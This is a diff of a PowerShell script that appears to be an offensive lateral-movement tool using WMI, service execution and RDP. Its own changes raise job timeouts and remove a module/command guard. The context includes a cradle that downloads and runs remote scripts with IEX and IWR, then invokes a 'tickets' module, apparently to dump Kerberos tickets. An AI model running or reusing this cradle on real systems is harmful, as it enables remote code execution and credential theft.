@@ -385,16 +385,8 @@ IF ($Method -ne "RDP" -and $SourceDomain -eq "") {
     }
 }
 
-######### Module / Command function #########
-if ($Module -ne "") {
-  Set-Variable -Name "Command" -Value $null; 
-  Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-  Write-Host "Commands will not be run with modules. Setting command to NULL"
-  Write-Host ""
-}
 
 ######### Module / Commands  #########
-
 
 if ($Module -eq "Tickets"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX (IWR -UseBasicParsing $MongooseURL)}catch{};IEX (IWR -UseBasicParsing $PandemoniumURL);Invoke-Pandemonium -Command ""tickets"""
@@ -662,7 +654,7 @@ elseif (!$osinfo){
 
     # Wait for any remaining jobs to complete
     $WMIJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 10
+        $JobFinished = $_ | Wait-Job -Timeout 100
 
         if ($JobFinished) {
             # Retrieve the job result and remove it from the job list
@@ -957,7 +949,7 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
 
     # Wait for any remaining jobs to complete
     $PSexecJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 10
+        $JobFinished = $_ | Wait-Job -Timeout 100
 
         if ($JobFinished) {
             # Retrieve the job result and remove it from the job list
@@ -1306,7 +1298,7 @@ $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, 
 
     # Wait for any remaining jobs to complete
     $RDPJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 10
+        $JobFinished = $_ | Wait-Job -Timeout 100
 
         if ($JobFinished) {
             # Retrieve the job result and remove it from the job list
